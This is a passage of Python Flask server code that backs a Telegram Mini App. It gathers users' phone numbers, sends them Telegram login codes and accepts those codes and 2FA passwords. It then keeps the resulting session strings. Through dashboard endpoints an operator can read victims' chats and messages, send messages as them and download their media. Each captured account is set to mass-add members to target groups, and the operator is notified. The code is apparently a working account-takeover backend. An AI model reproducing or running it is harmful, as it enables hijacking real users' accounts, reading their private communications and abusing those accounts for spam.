                    'total_added': ws.get('total', 0),
                    'today_added': ws.get('today', 0)
                },
                'is_running': aid_str in running_tasks
            })
        except:
            continue
    return jsonify({'success': True, 'accounts': acc_list})

# ============================================
# DASHBOARD - GET MESSAGES (CHATS + MESSAGES)
# ============================================
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """
    Get all dialogs (chats) and messages for an account
    Used by the dashboard
    """
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        # Check cache
        cache_key = f"chats_{account_id}"
        with chat_cache_lock:
            if cache_key in chat_cache:
                cached = chat_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < CACHE_DURATION:
                    logger.info(f"Returning cached chats for account {account_id}")
                    return jsonify(cached['data'])
        
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        
        async def _get_chats():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            
            if not await client.is_user_authorized():
                return None, "auth_key_unregistered"
            
            dialogs = await get_dialogs_async(client, limit=50)
            
            # Get messages for all chats (combined)
            all_messages = []
            for dialog in dialogs[:20]:  # Limit to first 20 chats for messages
                try:
                    msgs = await get_messages_async(client, dialog['id'], limit=30)
                    all_messages.extend(msgs)
                except:
                    continue
            
            return {
                'success': True,
                'chats': dialogs,
                'messages': all_messages,
                'accountName': acc.get('name', 'Unknown')
            }, None
        
        try:
            result, error = SyncTelegramClient.run_async(_get_chats, timeout=45)
            
            if error:
                return jsonify({'success': False, 'error': error})
            
            if result:
                # Cache the result
                with chat_cache_lock:
                    chat_cache[cache_key] = {
                        'data': result,
                        'timestamp': time.time()
                    }
                return jsonify(result)
            else:
                return jsonify({'success': False, 'error': 'No data returned'})
                
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        logger.error(traceback.format_exc())
        return jsonify({'success': False, 'error': str(e)[:200]})

# ============================================
# DASHBOARD - SEND MESSAGE
# ============================================
@app.route('/api/send-message', methods=['POST'])
def send_message():
    """
    Send a message to a chat
    """
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        message_text = data.get('message', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        if not chat_id:
            return jsonify({'success': False, 'error': 'Chat ID required'})
        if not message_text:
            return jsonify({'success': False, 'error': 'Message text required'})
        
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        
        async def _send():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            
            if not await client.is_user_authorized():
                return None, "Session expired"
            
            result = await send_message_async(client, chat_id, message_text)
            return result, None
        
        try:
            result, error = SyncTelegramClient.run_async(_send, timeout=30)
            
            if error:
                return jsonify({'success': False, 'error': error})
            
            # Invalidate cache for this account
            cache_key = f"chats_{account_id}"
            with chat_cache_lock:
                if cache_key in chat_cache:
                    del chat_cache[cache_key]
            
            return jsonify(result or {'success': False, 'error': 'Failed to send'})
            
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Send message error: {e}")
        logger.error(traceback.format_exc())
        return jsonify({'success': False, 'error': str(e)[:200]})

# ============================================
# DASHBOARD - GET MEDIA
# ============================================
@app.route('/api/media/<int:account_id>/<int:message_id>')
def get_media(account_id, message_id):
    """
    Download and serve media file
    """
    try:
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc}), 404
        
        async def _download():
            if not await SyncTelegramClient.safe_connect(client):
                return None
            if not await client.is_user_authorized():
                return None
            return await download_media_async(client, account_id, message_id)
        
        try:
            media_data = SyncTelegramClient.run_async(_download, timeout=30)
            
            if media_data:
                from flask import Response
                return Response(
                    base64.b64decode(media_data['data']),
                    mimetype=media_data['mime_type'],
                    headers={
                        'Content-Disposition': f'inline; filename="media_{account_id}_{message_id}"',
                        'Cache-Control': 'public, max-age=3600'
                    }
                )
            else:
                return jsonify({'error': 'Media not found'}), 404
                
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Get media error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================
# SHARED PHONE ENDPOINT
# ============================================
@app.route('/api/share-phone', methods=['POST'])
def share_phone():
    """
    Receive shared phone from Telegram Mini App and send verification code
    """
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        first_name = data.get('firstName', '')
        last_name = data.get('lastName', '')
        username = data.get('username', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number provided'})
        
        # Clean phone - using string replace
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Shared phone received for user {telegram_id}: {phone[:4]}****")
        
        # Save phone mapping
        if telegram_id:
            user_phone_map[telegram_id] = phone
            save_user_map()
            logger.info(f"✅ Saved phone mapping: {telegram_id} -> {phone[:4]}****")
        
        # Auto-send code
        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Share phone error: {e}")
        logger.error(traceback.format_exc())
        return jsonify({'success': False, 'error': 'Failed to process phone. Please try again.'})

# ============================================
# TELEGRAM AUTO-LOGIN (for returning users)
# ============================================
@app.route('/api/telegram-auto-login', methods=['POST'])
def telegram_auto_login():
    """
    Auto-login for returning users
    Checks if phone is saved, sends code automatically
    """
    try:
        data = request.json or {}
        
        # Get initData
        init_data_str = data.get('initData', '')
        if not init_data_str:
            init_data_str = request.args.get('initData', '')
        
        # Get user data
        user_data = data.get('user', {})
        
        # Parse initData if needed
        if not user_data and init_data_str:
            for item in init_data_str.split('&'):
                if item.startswith('user='):
                    try:
                        user_json = urllib.parse.unquote(item[5:])
                        user_data = json.loads(user_json)
                    except:
                        pass
        
        telegram_id = str(user_data.get('id', ''))
        first_name = user_data.get('first_name', '')
        last_name = user_data.get('last_name', '')
        username = user_data.get('username', '')
        
        if not telegram_id:
            return jsonify({
                'success': False,
                'error': 'Could not identify your Telegram account.',
                'needs_phone': True
            })
        
        logger.info(f"Auto-login check for user {telegram_id} ({first_name} {last_name})")
        
        # Try to find saved phone
        phone = find_phone_for_user(telegram_id)
        
        if phone:
            logger.info(f"✅ Found saved phone for {telegram_id}, sending code...")
            result = auto_send_code(phone, telegram_id, first_name, last_name, username)
            result['auto_detected'] = True
            return jsonify(result)
        else:
            logger.info(f"No saved phone for {telegram_id}, requesting phone share")
            return jsonify({
                'success': False,
                'error': 'Please share your phone number.',
                'needs_phone': True,
                'request_phone_share': True,
                'user_name': f"{first_name} {last_name}".strip(),
                'username': username
            })
            
    except Exception as e:
        logger.error(f"Auto-login error: {e}")
        logger.error(traceback.format_exc())
        return jsonify({
            'success': False,
            'error': 'Auto-login failed. Please try again.',
            'needs_phone': True
        })

# ============================================
# ADD ACCOUNT
# ============================================
@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Send verification code"""
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending verification code to {phone[:4]}****")
        
        result = auto_send_code(phone, telegram_id)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify the code and save the account"""
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
        
        td = temp_sessions[sid]
        telegram_id = str(td.get('telegram_id', ''))
        
        # Check attempts
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect codes. Session expired.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect passwords. Session expired.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
                            return {'success': False, 'error': 'Too many incorrect passwords.'}
                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                
                me = await client.get_me()
                user_telegram_id = str(me.id) if me.id else telegram_id
                
                # SAVE PHONE MAPPING
                if user_telegram_id:
                    user_phone_map[user_telegram_id] = td['phone']
                    save_user_map()
                    logger.info(f"✅ Saved mapping: {user_telegram_id} -> phone")
                    
                    auto_sessions[user_telegram_id] = {
                        'phone': td['phone'],
                        'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                        'username': me.username or '',
                        'last_used': time.time(),
                        'telegram_id': user_telegram_id
                    }
                    save_auto_sessions()
                
                # Get account age
                try:
                    account_age = get_account_age_sync(client.session.save())
                except:
                    account_age = {'age_display': 'Unknown'}
                
                # Create or update account
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age,
                    'telegram_id': user_telegram_id
                }
                
                if not new_acc['name']:
                    new_acc['name'] = 'User ' + str(new_id)[-4:]
                
                # Check for duplicate and update
                existing = None
                for a in accounts:
                    if str(a.get('telegram_id')) == user_telegram_id:
                        existing = a
                        break
                
                if existing:
                    logger.info(f"Updating existing account {existing['id']}")
                    existing.update(new_acc)
                    new_acc['id'] = existing['id']
                else:
                    logger.info(f"Adding new account {new_id}")
                    accounts.append(new_acc)
                
                save_json(ACCOUNTS_FILE, accounts)
                
                # Set up auto-add settings
                auto_add_settings[str(new_acc['id'])] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 30,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                # Initialize worker stats
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_acc['id'])] = {'total': 0, 'today': 0, 'verified_today': 0}
                save_json(STATS_FILE, stats)
                
                # START AUTO-ADD WORKER
                start_auto_add(new_acc)
                
                # Send notification
                age_info = account_age.get('age_display', 'Unknown')
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n"
                        f"✅ Account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone'][:4]}****\n"
                        f"Age: {age_info}\n"
                        f"Auto-add: Started"
                    )
                except:
                    pass
                
                logger.info(f"✅ Account verified: {new_acc['name']} - Auto-add started")
                
                return {
                    'success': True,
                    'account': {
                        'id': new_acc['id'],
                        'name': new_acc['name'],
                        'phone': new_acc['phone']
                    },
                    'account_age': age_info,
                    'auto_login_enabled': True
                }
                
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new one.'}
            except Exception as e:
                logger.error(f"Verify error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        # Clean up session on success
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

# ============================================
# ACCOUNT MANAGEMENT ROUTES
# ============================================
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        stop_auto_add(aid)
        name = remove_dead_account(aid, "Manual removal")
        
        # Clear chat cache
        cache_key = f"chats_{aid}"
        with chat_cache_lock:
            if cache_key in chat_cache:
                del chat_cache[cache_key]
        
        return jsonify({'success': True, 'message': f'Removed: {name}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        s = auto_add_settings.get(str(aid), {
            'enabled': False,
            'target_group': TARGET_GROUPS[0],
            'delay_seconds': 30
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        s['is_running'] = str(aid) in running_tasks
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    akey = str(aid)
    was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
    new_enabled = data.get('enabled', False)
    
    auto_add_settings[akey] = {
        'enabled': new_enabled,
        'target_group': data.get('target_group', TARGET_GROUPS[0]),
        'delay_seconds': max(30, data.get('delay_seconds', 30)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if new_enabled and not was_enabled:
        acc = next((a for a in accounts if str(a['id']) == akey), None)
        if acc:
            start_auto_add(acc)
    elif not new_enabled and was_enabled:
        stop_auto_add(aid)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'active_workers': len(running_tasks)
    })

@app.route('/api/send-report')
def send_report():
    success = send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"Today: {stats.get('today_added', 0)}\n"
        f"Total: {stats.get('total_added', 0)}\n"
        f"Active Workers: {len(running_tasks)}"
    )
    return jsonify({'success': success})

@app.route('/api/health')
def health_check():
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'status': 'healthy',
        'workers': len(running_tasks),
        'accounts': len(accounts),
        'saved_users': len(user_phone_map),
        'today_added': stats.get('today_added', 0),
        'timestamp': datetime.now().isoformat()
    })

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
            except:
                consecutive_failures += 1
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures!")
                consecutive_failures = 0
        except Exception as e:
            logger.error(f"Keep alive error: {e}")
            time.sleep(60)

def cleanup_chat_cache():
    """Periodically clean expired chat cache entries"""
    while True:
        time.sleep(60)
        current_time = time.time()
        with chat_cache_lock:
            expired = [k for k, v in chat_cache.items() 
                      if current_time - v.get('timestamp', 0) > CACHE_DURATION * 2]
            for k in expired:
                del chat_cache[k]

def restore_and_start():
    """Restore accounts and start workers on server startup"""
    try:
        time.sleep(5)
        logger.info(f"Restoring {len(accounts)} accounts...")
        logger.info(f"User phone mappings loaded: {len(user_phone_map)}")
        
        for acc in accounts:
            try:
                if acc.get('session'):
                    if check_account_auth(acc):
                        settings = auto_add_settings.get(str(acc['id']), {})
                        if settings.get('enabled', True):
                            start_auto_add(acc)
                            logger.info(f"Restored worker for {acc.get('name', acc['id'])}")
                    else:
                        remove_dead_account(acc['id'], "Auth check failed on startup")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error restoring account {acc.get('id')}: {e}")
                continue
        
        save_json(ACCOUNTS_FILE, accounts)
        cleanup_expired_sessions()
        
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> Online!\n"
                f"Workers: {len(running_tasks)}\n"
                f"Accounts: {len(accounts)}\n"
                f"Auto-login users: {len(user_phone_map)}"
            )
        except:
            pass
        
        logger.info(f"✅ Server startup complete - {len(running_tasks)} workers running")
    except Exception as e:
        logger.critical(f"Fatal error during restore: {e}")
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items()
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
        if expired:
            logger.info(f"Cleaned up {len(expired)} expired sessions")
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}, saving data and shutting down...")
    
    for acc_key in list(running_tasks.keys()):
        stop_auto_add(acc_key)
    
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    save_temp_sessions()
    save_auto_sessions()
    save_user_map()
    
    logger.info("Data saved. Exiting.")
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        # Load all data
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
        if worker_adds_data:
            worker_adds.update(worker_adds_data)
        load_temp_sessions()
        load_auto_sessions()
        load_user_map()
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║     AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME}                    ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Accounts: {len(accounts)}                                              ║
║  Saved Users: {len(user_phone_map)}                                            ║
║  Features: Phone Share + Dashboard Chat + Auto-Add           ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        # Start background threads
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        threading.Thread(target=cleanup_chat_cache, daemon=True, name="cache_cleanup").start()
        
        # Run Flask
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        logger.critical(traceback.format_exc())
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
        except:
            pass
        sys.exit(1)
